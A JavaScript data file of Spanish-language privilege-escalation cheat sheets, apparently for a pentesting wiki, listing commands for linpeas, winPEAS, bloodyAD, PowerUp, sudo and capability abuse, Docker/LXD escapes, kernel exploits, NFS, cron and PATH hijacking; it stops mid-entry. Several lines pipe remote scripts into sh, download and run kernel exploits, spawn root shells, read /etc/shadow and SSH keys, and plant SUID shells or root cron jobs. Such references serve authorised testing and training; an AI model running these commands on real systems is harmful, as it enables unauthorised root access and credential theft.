// Escalada de Privilegios (Privilege Escalation)
window.WIKI_CHEATSHEETS_06_PRIVESC = [
 {
  "tool": "linpeas",
  "desc": "Linux Privilege Escalation Awesome Script - enumeración automática",
  "commands": [
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    "desc": "Ejecutar desde memoria"
   },
   {
    "cmd": "./linpeas.sh",
    "desc": "Ejecución local"
   },
   {
    "cmd": "./linpeas.sh -a",
    "desc": "Escaneo completo (todas las pruebas)"
   },
   {
    "cmd": "./linpeas.sh -s",
    "desc": "Solo enumeración básica"
   },
   {
    "cmd": "./linpeas.sh -e",
    "desc": "Enumeración extra"
   },
   {
    "cmd": "./linpeas.sh -q",
    "desc": "Modo silencioso"
   },
   {
    "cmd": "./linpeas.sh -d",
    "desc": "Solo debug"
   },
   {
    "cmd": "./linpeas.sh -t",
    "desc": "Solo procesos y redes"
   },
   {
    "cmd": "./linpeas.sh -r",
    "desc": "Solo herramientas de kernel"
   },
   {
    "cmd": "./linpeas.sh -w",
    "desc": "Solo archivos writables"
   },
   {
    "cmd": "./linpeas.sh -P",
    "desc": "Solo passwords y archivos"
   },
   {
    "cmd": "./linpeas.sh -S",
    "desc": "Solo SUID/SGID"
   },
   {
    "cmd": "./linpeas.sh -o out.txt",
    "desc": "Guardar en archivo"
   },
   {
    "cmd": "./linpeas.sh -a | tee linpeas.txt",
    "desc": "Guardar con salida"
   },
   {
    "cmd": "./linpeas.sh -i",
    "desc": "Modo interactivo"
   },
   {
    "cmd": "bash linpeas.sh -a -q",
    "desc": "Completo y silencioso"
   },
   {
    "cmd": "curl -L bit.ly/linpeas | sh",
    "desc": "Atajo corto"
   }
  ]
 },
 {
  "tool": "winpeas",
  "desc": "Windows Privilege Escalation Awesome Script",
  "commands": [
   {
    "cmd": ".\\winPEASx64.exe",
    "desc": "Ejecutar versión x64"
   },
   {
    "cmd": "winPEASx64.exe -a",
    "desc": "Escaneo completo"
   },
   {
    "cmd": "winPEASx64.exe -quiet",
    "desc": "Modo silencioso"
   },
   {
    "cmd": ".\\winPEASx64.exe servicesinfo",
    "desc": "Info de servicios"
   },
   {
    "cmd": ".\\winPEASx64.exe userinfo",
    "desc": "Info de usuario"
   },
   {
    "cmd": "winPEASx64.exe systeminfo",
    "desc": "Info del sistema"
   },
   {
    "cmd": "winPEASx64.exe searchfast",
    "desc": "Búsqueda rápida de archivos"
   },
   {
    "cmd": "winPEASx64.exe filesinfo",
    "desc": "Archivos de interés"
   },
   {
    "cmd": "winPEASx64.exe -wait 10",
    "desc": "Esperar 10 segundos"
   },
   {
    "cmd": "winPEASx64.exe -debug",
    "desc": "Modo debug"
   },
   {
    "cmd": ".\\winPEAS.bat -a",
    "desc": "Versión batch"
   }
  ]
 },
 {
  "tool": "peass-ng",
  "desc": "Suite PEASS (LinPEAS + WinPEAS + MacPEAS)",
  "commands": [
   {
    "cmd": "ls /usr/share/peass/",
    "desc": "Explorar suite PEASS"
   },
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
    "desc": "Descargar linpeas"
   },
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe",
    "desc": "Descargar winpeas"
   },
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/macPEAS.sh -o macpeas.sh",
    "desc": "Descargar macpeas"
   },
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o linpeas",
    "desc": "Binario estático"
   },
   {
    "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -o winpeas86.exe",
    "desc": "WinPEAS 32 bits"
   }
  ]
 },
 {
  "tool": "unix-privesc-check",
  "desc": "Comprobar configuraciones inseguras para escalada en Unix",
  "commands": [
   {
    "cmd": "unix-privesc-check standard",
    "desc": "Chequeo estándar"
   },
   {
    "cmd": "unix-privesc-check detailed",
    "desc": "Chequeo detallado"
   },
   {
    "cmd": "unix-privesc-check standard > result.txt",
    "desc": "Guardar resultados"
   },
   {
    "cmd": "unix-privesc-check detailed 2>&1 | tee out.txt",
    "desc": "Con salida completa"
   }
  ]
 },
 {
  "tool": "bloodyad",
  "desc": "Herramienta de ataque a Active Directory (sin credenciales y con)",
  "commands": [
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get object 'CN=admin'",
    "desc": "Obtener objeto AD"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get children 'OU=Users'",
    "desc": "Listar hijos"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass add user 'new_user'",
    "desc": "Añadir usuario"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass add group 'new_group'",
    "desc": "Añadir grupo"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass change password user 'newpass'",
    "desc": "Cambiar password"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass set genericAll 'target_user' 'attacker'",
    "desc": "Set ACL genericAll"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass set owner target_user attacker",
    "desc": "Cambiar owner"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass add groupMember group user",
    "desc": "Añadir miembro al grupo"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get userKerberoast user",
    "desc": "Kerberoast un usuario"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get userAsRepRoast user",
    "desc": "ASREProast"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get dcsync 'user'",
    "desc": "Simular DCSync"
   },
   {
    "cmd": "bloodyAD --host 192.168.1.10 -d dom.local -u user -p pass get search --filter '(objectClass=user)'",
    "desc": "Búsqueda LDAP"
   }
  ]
 },
 {
  "tool": "lynis",
  "desc": "Auditoría de seguridad del sistema (Linux/Unix)",
  "commands": [
   {
    "cmd": "lynis audit system",
    "desc": "Auditar el sistema completo"
   },
   {
    "cmd": "lynis audit system --quick",
    "desc": "Auditoría rápida"
   },
   {
    "cmd": "lynis audit system --pentest",
    "desc": "Modo pentest"
   },
   {
    "cmd": "lynis audit system --tests filesystem",
    "desc": "Tests específicos"
   },
   {
    "cmd": "lynis audit system --skip-test group-tests",
    "desc": "Saltar tests"
   },
   {
    "cmd": "lynis audit system --report-file out.txt",
    "desc": "Guardar reporte"
   },
   {
    "cmd": "lynis audit system --log-file log.txt",
    "desc": "Log custom"
   },
   {
    "cmd": "lynis audit system --no-colors",
    "desc": "Sin colores"
   },
   {
    "cmd": "lynis audit system --cronjob",
    "desc": "Modo cron"
   },
   {
    "cmd": "lynis update info",
    "desc": "Info de actualización"
   },
   {
    "cmd": "lynis show version",
    "desc": "Versión"
   },
   {
    "cmd": "lynis show tests",
    "desc": "Mostrar tests disponibles"
   },
   {
    "cmd": "lynis show hardening-index",
    "desc": "Índice de hardening"
   },
   {
    "cmd": "lynis show pentest",
    "desc": "Resultados pentest"
   },
   {
    "cmd": "lynis audit system --upload",
    "desc": "Subir reporte anónimo"
   },
   {
    "cmd": "lynis audit system --verbose",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "pspy",
  "desc": "Monitorizar procesos sin privilegios root (detección de cronjobs)",
  "commands": [
   {
    "cmd": "./pspy64",
    "desc": "Ejecutar monitor en x64"
   },
   {
    "cmd": "./pspy64 -p 3000",
    "desc": "Polling cada 3000ms"
   },
   {
    "cmd": "./pspy64 -i 100",
    "desc": "Intervalo de 100ms"
   },
   {
    "cmd": "./pspy64 -t 5",
    "desc": "Timeout de 5s"
   },
   {
    "cmd": "./pspy64 -f",
    "desc": "Mostrar todos los procesos"
   },
   {
    "cmd": "./pspy64 -n",
    "desc": "Sin resolución de nombres"
   },
   {
    "cmd": "./pspy64 -r",
    "desc": "Mostrar comandos ejecutados"
   },
   {
    "cmd": "./pspy64 -l",
    "desc": "Log a archivo"
   },
   {
    "cmd": "./pspy32 -p 2000",
    "desc": "Versión 32 bits"
   }
  ]
 },
 {
  "tool": "linux-exploit-suggester",
  "desc": "Sugeridor de exploits de kernel Linux",
  "commands": [
   {
    "cmd": "les.sh",
    "desc": "Ejecutar análisis"
   },
   {
    "cmd": "linux-exploit-suggester.sh --kernel 4.4.0",
    "desc": "Kernel específico"
   },
   {
    "cmd": "linux-exploit-suggester.sh --checksec",
    "desc": "Comprobar protecciones"
   },
   {
    "cmd": "linux-exploit-suggester.sh --db",
    "desc": "Con base de datos"
   },
   {
    "cmd": "linux-exploit-suggester.sh --exploits-only",
    "desc": "Solo exploits"
   },
   {
    "cmd": "linux-exploit-suggester.sh --clean",
    "desc": "Salida limpia"
   }
  ]
 },
 {
  "tool": "traitor",
  "desc": "Detectar y explotar vectores de escalada automáticamente",
  "commands": [
   {
    "cmd": "traitor -p",
    "desc": "Solo detectar (no explotar)"
   },
   {
    "cmd": "traitor -a",
    "desc": "Automatizar explotación"
   },
   {
    "cmd": "traitor -e 'docker'",
    "desc": "Explotar vector específico"
   },
   {
    "cmd": "traitor -l",
    "desc": "Listar vectores"
   },
   {
    "cmd": "traitor -p -l",
    "desc": "Detectar con lista"
   },
   {
    "cmd": "traitor -a --ignore-unsafe",
    "desc": "Ignorar vectores inseguros"
   },
   {
    "cmd": "traitor -v",
    "desc": "Verbose"
   },
   {
    "cmd": "traitor -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "gtfobins",
  "desc": "Base de datos local de binarios abusables (GTFOBins)",
  "commands": [
   {
    "cmd": "python3 -m gtfobins grep sudo",
    "desc": "Buscar binarios con sudo"
   },
   {
    "cmd": "gtfobins suid",
    "desc": "Buscar binarios SUID"
   },
   {
    "cmd": "gtfobins sudo -c 'whoami'",
    "desc": "Buscar comandos ejecutables"
   },
   {
    "cmd": "grep -r 'SUID' /usr/share/gtfobins/",
    "desc": "Buscar en la BD local"
   }
  ]
 },
 {
  "tool": "linux-exploit-suggester-2",
  "desc": "Sugeridor de exploits Linux (pl_perl style)",
  "commands": [
   {
    "cmd": "./linux-exploit-suggester-2.pl",
    "desc": "Ejecutar"
   },
   {
    "cmd": "./linux-exploit-suggester-2.pl -k 4.4.0",
    "desc": "Kernel específico"
   },
   {
    "cmd": "./linux-exploit-suggester-2.pl -p",
    "desc": "Pipe mode"
   },
   {
    "cmd": "./linux-exploit-suggester-2.pl -d",
    "desc": "Debug"
   },
   {
    "cmd": "./linux-exploit-suggester-2.pl -u",
    "desc": "Update"
   },
   {
    "cmd": "./linux-exploit-suggester-2.pl -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wesng",
  "desc": "Windows Exploit Suggester NG",
  "commands": [
   {
    "cmd": "python3 wes.py systeminfo.txt",
    "desc": "Analizar systeminfo"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -i",
    "desc": "Solo aplicables"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -d",
    "desc": "Definiciones"
   },
   {
    "cmd": "python3 wes.py --update",
    "desc": "Actualizar DB"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -o out.csv",
    "desc": "CSV"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -o out.html",
    "desc": "HTML"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -o out.json",
    "desc": "JSON"
   },
   {
    "cmd": "python3 wes.py systeminfo.txt -s",
    "desc": "Sin verbosity"
   },
   {
    "cmd": "python3 wes.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "lse",
  "desc": "Linux Smart Enumeration (privesc)",
  "commands": [
   {
    "cmd": "bash lse.sh",
    "desc": "Nivel 1"
   },
   {
    "cmd": "bash lse.sh -l 1",
    "desc": "Nivel 1"
   },
   {
    "cmd": "bash lse.sh -l 2",
    "desc": "Nivel 2"
   },
   {
    "cmd": "bash lse.sh -l 2 -i",
    "desc": "Interactivo"
   },
   {
    "cmd": "bash lse.sh -l 1 -s",
    "desc": "Salida corta"
   },
   {
    "cmd": "bash lse.sh -l 2 -u",
    "desc": "Solo usuario actual"
   },
   {
    "cmd": "bash lse.sh -l 2 -c",
    "desc": "Con colores"
   },
   {
    "cmd": "bash lse.sh -l 2 -a",
    "desc": "All tests"
   },
   {
    "cmd": "bash lse.sh -l 2 -p",
    "desc": "Paginado"
   },
   {
    "cmd": "bash lse.sh -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "linbofs",
  "desc": "Linux privilege escalation checklist automatizado",
  "commands": [
   {
    "cmd": "bash LinEnum.sh",
    "desc": "Enumerar"
   },
   {
    "cmd": "bash LinEnum.sh -t",
    "desc": "Thorough"
   },
   {
    "cmd": "bash LinEnum.sh -e /tmp/out.txt",
    "desc": "Exportar"
   },
   {
    "cmd": "bash LinEnum.sh -r informe.txt",
    "desc": "Reporte"
   },
   {
    "cmd": "bash LinEnum.sh -p",
    "desc": "Permisos"
   },
   {
    "cmd": "bash LinEnum.sh -s",
    "desc": "Sudo"
   },
   {
    "cmd": "bash LinEnum.sh -t -e /tmp/out.txt",
    "desc": "Thorough+export"
   }
  ]
 },
 {
  "tool": "suid3num",
  "desc": "Enumerar binarios SUID explotables (GTFOBins)",
  "commands": [
   {
    "cmd": "python3 suid3num.py",
    "desc": "Escaneo"
   },
   {
    "cmd": "python3 suid3num.py -c",
    "desc": "Con colores"
   },
   {
    "cmd": "python3 suid3num.py -o /tmp/out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "python3 suid3num.py -d",
    "desc": "Debug"
   },
   {
    "cmd": "python3 suid3num.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "powerup",
  "desc": "Módulo PowerShell de escalada de privilegios",
  "commands": [
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Invoke-AllChecks'",
    "desc": "Checks completos"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-ServiceUnquoted'",
    "desc": "Servicios sin comillas"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-UnattendedInstallFiles'",
    "desc": "Unattended install"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-ModifiableServiceFile'",
    "desc": "Servicios modificables"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-RegistryAutoLogon'",
    "desc": "AutoLogon"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-ServicePermission'",
    "desc": "Permisos de servicio"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Get-VulnAutoLogon'",
    "desc": "AutoLogon vulnerable"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Write-UserAddScript'",
    "desc": "Script de usuario"
   },
   {
    "cmd": "powershell -ep bypass -c 'Import-Module PowerUp.ps1; Install-ServiceBinary -Name X -Command whoami'",
    "desc": "Instalar binario"
   }
  ]
 },
 {
  "tool": "linpostexp",
  "desc": "Script de post-explotación Linux",
  "commands": [
   {
    "cmd": "bash linpostexp.sh",
    "desc": "Ejecutar"
   },
   {
    "cmd": "bash linpostexp.sh -a",
    "desc": "Todo"
   },
   {
    "cmd": "bash linpostexp.sh -u",
    "desc": "Usuario"
   },
   {
    "cmd": "bash linpostexp.sh -n",
    "desc": "Red"
   },
   {
    "cmd": "bash linpostexp.sh -s",
    "desc": "Servicios"
   },
   {
    "cmd": "bash linpostexp.sh -k",
    "desc": "Kernel"
   },
   {
    "cmd": "bash linpostexp.sh -p",
    "desc": "Procesos"
   },
   {
    "cmd": "bash linpostexp.sh -f",
    "desc": "Archivos"
   },
   {
    "cmd": "bash linpostexp.sh -c",
    "desc": "Credenciales"
   },
   {
    "cmd": "bash linpostexp.sh -e",
    "desc": "Exploits"
   },
   {
    "cmd": "bash linpostexp.sh -o /tmp/out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "bash linpostexp.sh -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "postenum",
  "desc": "Enumeración post-explotación Linux",
  "commands": [
   {
    "cmd": "bash postenum.sh",
    "desc": "Enumerar"
   },
   {
    "cmd": "bash postenum.sh -s",
    "desc": "Silent"
   },
   {
    "cmd": "bash postenum.sh -v",
    "desc": "Verbose"
   },
   {
    "cmd": "bash postenum.sh -k",
    "desc": "Kernel"
   },
   {
    "cmd": "bash postenum.sh -u",
    "desc": "Users"
   },
   {
    "cmd": "bash postenum.sh -c",
    "desc": "Cron"
   },
   {
    "cmd": "bash postenum.sh -n",
    "desc": "Red"
   },
   {
    "cmd": "bash postenum.sh -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "windows-exploit-suggester",
  "desc": "Sugerir exploits según versión de Windows",
  "commands": [
   {
    "cmd": "python2 windows-exploit-suggester.py --update",
    "desc": "Actualizar DB"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -d db.csv -i systeminfo.txt",
    "desc": "Sugerir"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -d db.csv -i sys.txt --exploit",
    "desc": "Con exploits"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -d db.csv -i sys.txt --nofilter",
    "desc": "Sin filtrar"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -d db.csv -i sys.txt --hotfixes",
    "desc": "Hotfixes"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -d db.csv -i sys.txt --out out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "python2 windows-exploit-suggester.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "beroot",
  "desc": "Escalada de privilegios Windows/Linux (beRoot)",
  "commands": [
   {
    "cmd": "python2 beroot.py",
    "desc": "Check Windows"
   },
   {
    "cmd": "python2 beroot.py --unix",
    "desc": "Check Linux"
   },
   {
    "cmd": "python2 beroot.py --dump",
    "desc": "Dump"
   },
   {
    "cmd": "python2 beroot.py --exploit",
    "desc": "Explotar"
   },
   {
    "cmd": "python2 beroot.py -p service",
    "desc": "Solo servicios"
   },
   {
    "cmd": "python2 beroot.py -p files",
    "desc": "Archivos"
   },
   {
    "cmd": "python2 beroot.py -p registry",
    "desc": "Registro"
   },
   {
    "cmd": "python2 beroot.py -p token",
    "desc": "Tokens"
   },
   {
    "cmd": "python2 beroot.py -p startup",
    "desc": "Startup"
   },
   {
    "cmd": "python2 beroot.py --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "linuxprivchecker",
  "desc": "Check de escalada de privilegios Linux",
  "commands": [
   {
    "cmd": "python2 linuxprivchecker.py",
    "desc": "Enumerar"
   },
   {
    "cmd": "python2 linuxprivchecker.py -w",
    "desc": "Con wordlist"
   },
   {
    "cmd": "python2 linuxprivchecker.py -w wordlist.txt",
    "desc": "Wordlist custom"
   },
   {
    "cmd": "python2 linuxprivchecker.py -k",
    "desc": "Kernel exploits"
   },
   {
    "cmd": "python2 linuxprivchecker.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "sudo-abuse",
  "desc": "Abusar de permisos sudo (sudo -l exploitation)",
  "commands": [
   {
    "cmd": "sudo -l",
    "desc": "Listar permisos"
   },
   {
    "cmd": "sudo -l | grep NOPASSWD",
    "desc": "Sin password"
   },
   {
    "cmd": "sudo -u root /bin/sh",
    "desc": "Shell"
   },
   {
    "cmd": "sudo -u root find / -exec /bin/sh \\\\;",
    "desc": "Find shell"
   },
   {
    "cmd": "sudo -u root vi /etc/shadow",
    "desc": "Vi como root"
   },
   {
    "cmd": "sudo -u root less /etc/shadow",
    "desc": "Less"
   },
   {
    "cmd": "sudo -u root more /etc/passwd",
    "desc": "More"
   },
   {
    "cmd": "sudo -u root man man",
    "desc": "Man pager"
   },
   {
    "cmd": "sudo -u root awk 'BEGIN {system(\"/bin/sh\")}'",
    "desc": "Awk shell"
   },
   {
    "cmd": "sudo -u root perl -e 'exec \"/bin/sh\"'",
    "desc": "Perl shell"
   },
   {
    "cmd": "sudo -u root python3 -c 'import os; os.system(\"/bin/sh\")'",
    "desc": "Python shell"
   },
   {
    "cmd": "sudo -u root git -p help config",
    "desc": "Git shell"
   },
   {
    "cmd": "sudo -u root env /bin/sh",
    "desc": "Env shell"
   },
   {
    "cmd": "sudo -u root nmap --interactive",
    "desc": "Nmap interactive"
   },
   {
    "cmd": "sudo -u root tcpdump -w /tmp/x -z /bin/sh -i lo",
    "desc": "Tcpdump shell"
   },
   {
    "cmd": "sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "desc": "Tar shell"
   },
   {
    "cmd": "sudo -u root zip /tmp/x /tmp/y -T -TT /bin/sh",
    "desc": "Zip shell"
   },
   {
    "cmd": "sudo -u root systemctl",
    "desc": "Systemctl"
   },
   {
    "cmd": "sudo -u root journalctl !/bin/sh",
    "desc": "Journalctl shell"
   },
   {
    "cmd": "sudo -u root vim -c ':!/bin/sh'",
    "desc": "Vim shell"
   }
  ]
 },
 {
  "tool": "docker-privesc",
  "desc": "Escalada de privilegios con Docker",
  "commands": [
   {
    "cmd": "docker ps",
    "desc": "Contenedores"
   },
   {
    "cmd": "docker run -it --rm -v /:/mnt alpine /bin/sh",
    "desc": "Montar root"
   },
   {
    "cmd": "docker run -it --rm --privileged alpine /bin/sh",
    "desc": "Privileged"
   },
   {
    "cmd": "docker run -it --rm -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow",
    "desc": "Leer shadow"
   },
   {
    "cmd": "docker run -it --rm --net=host alpine sh",
    "desc": "Red host"
   },
   {
    "cmd": "docker exec -it CONTAINER /bin/bash",
    "desc": "Exec en contenedor"
   },
   {
    "cmd": "docker exec -it CONTAINER /bin/sh -c 'id'",
    "desc": "Exec comando"
   },
   {
    "cmd": "docker inspect CONTAINER",
    "desc": "Inspeccionar"
   },
   {
    "cmd": "docker images",
    "desc": "Imágenes"
   },
   {
    "cmd": "docker run -it --rm -v /root/.ssh:/mnt alpine sh -c 'cat /mnt/authorized_keys'",
    "desc": "Leer SSH"
   },
   {
    "cmd": "docker run -it --rm -v /:/host chroot /host /bin/bash",
    "desc": "Chroot"
   },
   {
    "cmd": "docker run -it --rm --pid=host alpine sh",
    "desc": "PID host"
   },
   {
    "cmd": "ls /var/run/docker.sock",
    "desc": "Socket docker"
   },
   {
    "cmd": "docker -H unix:///var/run/docker.sock info",
    "desc": "Info"
   },
   {
    "cmd": "docker run -it --rm -v /:/mnt --entrypoint=/bin/sh alpine",
    "desc": "Entrypoint"
   }
  ]
 },
 {
  "tool": "lxd-privesc",
  "desc": "Escalada de privilegios con LXD/LXC",
  "commands": [
   {
    "cmd": "id | grep lxd",
    "desc": "¿Grupo lxd?"
   },
   {
    "cmd": "lxc image list",
    "desc": "Imágenes"
   },
   {
    "cmd": "lxc image import alpine.tar.gz --alias alpine",
    "desc": "Importar"
   },
   {
    "cmd": "lxc init alpine privesc -c security.privileged=true",
    "desc": "Contenedor privilegiado"
   },
   {
    "cmd": "lxc config device add privesc host disk source=/ path=/mnt/root recursive=true",
    "desc": "Montar root"
   },
   {
    "cmd": "lxc start privesc",
    "desc": "Iniciar"
   },
   {
    "cmd": "lxc exec privesc -- /bin/sh",
    "desc": "Shell"
   },
   {
    "cmd": "cat /mnt/root/etc/shadow",
    "desc": "Leer shadow"
   },
   {
    "cmd": "lxc exec privesc -- cat /mnt/root/etc/passwd",
    "desc": "Passwd"
   },
   {
    "cmd": "lxc delete privesc -f",
    "desc": "Borrar"
   },
   {
    "cmd": "lxc list",
    "desc": "Listar"
   },
   {
    "cmd": "lxc config show privesc",
    "desc": "Config"
   }
  ]
 },
 {
  "tool": "kernel-exploits",
  "desc": "Explotación de vulnerabilidades de kernel",
  "commands": [
   {
    "cmd": "uname -a",
    "desc": "Versión kernel"
   },
   {
    "cmd": "cat /etc/os-release",
    "desc": "Distro"
   },
   {
    "cmd": "cat /proc/version",
    "desc": "Kernel info"
   },
   {
    "cmd": "searchsploit 'linux kernel' | grep -i local",
    "desc": "Buscar exploits"
   },
   {
    "cmd": "searchsploit 'kernel 5.4'",
    "desc": "Por versión"
   },
   {
    "cmd": "curl -s 'https://raw.githubusercontent.com/exploit-database/exploitdb/master/exploits/linux/local/40839.c' -o dirty.c",
    "desc": "DirtyCow"
   },
   {
    "cmd": "gcc -pthread dirty.c -o dirty -lcrypt",
    "desc": "Compilar"
   },
   {
    "cmd": "./dirty newpassword",
    "desc": "Ejecutar"
   },
   {
    "cmd": "curl -s 'https://raw.githubusercontent.com/JlSakuya/Linux-Privilege-Escalation-Exploits/master/exploits/overlayfs/cve-2021-3493/exploit.c' -o cve.c",
    "desc": "CVE-2021-3493"
   },
   {
    "cmd": "gcc cve.c -o cve && ./cve",
    "desc": "Compilar y ejecutar"
   },
   {
    "cmd": "searchsploit -m 4757",
    "desc": "Exploit 4757"
   },
   {
    "cmd": "./4757",
    "desc": "Ejecutar"
   },
   {
    "cmd": "lsmod | head -30",
    "desc": "Módulos"
   },
   {
    "cmd": "/sbin/modinfo MODULO | head",
    "desc": "Info módulo"
   },
   {
    "cmd": "sysctl -a | grep -i smep",
    "desc": "SMEP"
   }
  ]
 },
 {
  "tool": "capabilities-privesc",
  "desc": "Abusar de capabilities POSIX",
  "commands": [
   {
    "cmd": "getcap -r / 2>/dev/null",
    "desc": "Buscar caps"
   },
   {
    "cmd": "getcap /usr/bin/python3",
    "desc": "Cap python"
   },
   {
    "cmd": "getcap /usr/bin/tar",
    "desc": "Cap tar"
   },
   {
    "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "desc": "Abusar python cap"
   },
   {
    "cmd": "tar -cvf /tmp/x /etc/shadow",
    "desc": "Tar con cap"
   },
   {
    "cmd": "setcap cap_setuid+ep /usr/bin/python3",
    "desc": "Añadir cap"
   },
   {
    "cmd": "setcap -r /usr/bin/python3",
    "desc": "Quitar cap"
   },
   {
    "cmd": "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'",
    "desc": "Perl cap"
   },
   {
    "cmd": "find / -executable -perm -4000 2>/dev/null",
    "desc": "SUID"
   },
   {
    "cmd": "getcap -r /usr/bin /usr/sbin 2>/dev/null",
    "desc": "Caps en bins"
   }
  ]
 },
 {
  "tool": "nfs-privesc",
  "desc": "Escalada con NFS (no_root_squash)",
  "commands": [
   {
    "cmd": "showmount -e IP",
    "desc": "Exportaciones"
   },
   {
    "cmd": "mount -t nfs IP:/ /mnt -o nolock",
    "desc": "Montar"
   },
   {
    "cmd": "mount -t nfs IP:/home/user /mnt -o vers=3",
    "desc": "v3"
   },
   {
    "cmd": "cat /etc/exports",
    "desc": "Config local"
   },
   {
    "cmd": "ls -la /mnt/",
    "desc": "Ver montado"
   },
   {
    "cmd": "grep -r 'no_root_squash' /etc/exports",
    "desc": "Buscar flag"
   },
   {
    "cmd": "cp /bin/bash /mnt/bash && chmod u+s /mnt/bash",
    "desc": "SUID bash"
   },
   {
    "cmd": "/mnt/bash -p",
    "desc": "Ejecutar SUID"
   },
   {
    "cmd": "cp /tmp/payload /mnt/ && chmod +x /mnt/payload",
    "desc": "Copiar payload"
   },
   {
    "cmd": "umount /mnt",
    "desc": "Desmontar"
   },
   {
    "cmd": "nmap --script=nfs-showmount -p111 IP",
    "desc": "Nmap nfs"
   },
   {
    "cmd": "rpcclient -U '' IP",
    "desc": "Rpcclient"
   },
   {
    "cmd": "cat /proc/mounts | grep nfs",
    "desc": "Montajes nfs"
   },
   {
    "cmd": "df -h | grep nfs",
    "desc": "Volúmenes nfs"
   }
  ]
 },
 {
  "tool": "cron-privesc",
  "desc": "Escalada con crontab (jobs de root)",
  "commands": [
   {
    "cmd": "cat /etc/crontab",
    "desc": "Crontab"
   },
   {
    "cmd": "ls -la /etc/cron.*",
    "desc": "Cron dirs"
   },
   {
    "cmd": "cat /etc/cron.d/* 2>/dev/null",
    "desc": "Cron.d"
   },
   {
    "cmd": "crontab -l",
    "desc": "Mi crontab"
   },
   {
    "cmd": "grep -r 'root' /var/spool/cron/ 2>/dev/null",
    "desc": "Crons root"
   },
   {
    "cmd": "grep -rn 'script' /etc/cron* 2>/dev/null",
    "desc": "Scripts en cron"
   },
   {
    "cmd": "ls -la /var/spool/cron/crontabs/",
    "desc": "Crontabs"
   },
   {
    "cmd": "printf '#!/bin/sh\\ncp /bin/sh /tmp/sh && chmod u+s /tmp/sh\\n' > /usr/local/bin/backup.sh",
    "desc": "Exploit script"
   },
   {
    "cmd": "chmod 777 /usr/local/bin/backup.sh",
    "desc": "Permisos"
   },
   {
    "cmd": "/tmp/sh -p",
    "desc": "Shell SUID"
   },
   {
    "cmd": "echo '* * * * * root chmod u+s /bin/bash' >> /etc/crontab",
    "desc": "Añadir cron"
   },
   {
    "cmd": "watch -n 1 'ls -la /usr/local/bin/'",
    "desc": "Watch script"
   },
   {
    "cmd": "ps aux | grep cron",
    "desc": "Cron procesos"
   },
   {
    "cmd": "systemctl status cron | head",
    "desc": "Estado cron"
   }
  ]
 },
 {
  "tool": "path-hijack",
  "desc": "Escalada por secuestro de PATH",
  "commands": [
   {
    "cmd": "echo $PATH",
    "desc": "Ver PATH"
   },
   {
    "cmd": "cat /etc/environment",
    "desc": "Env global"
   },
   {
    "cmd": "echo $PATH | tr ':' '\\n'",
    "desc": "Partes del PATH"
   },
   {
    "cmd": "find / -writable -type d 2>/dev/null | head",
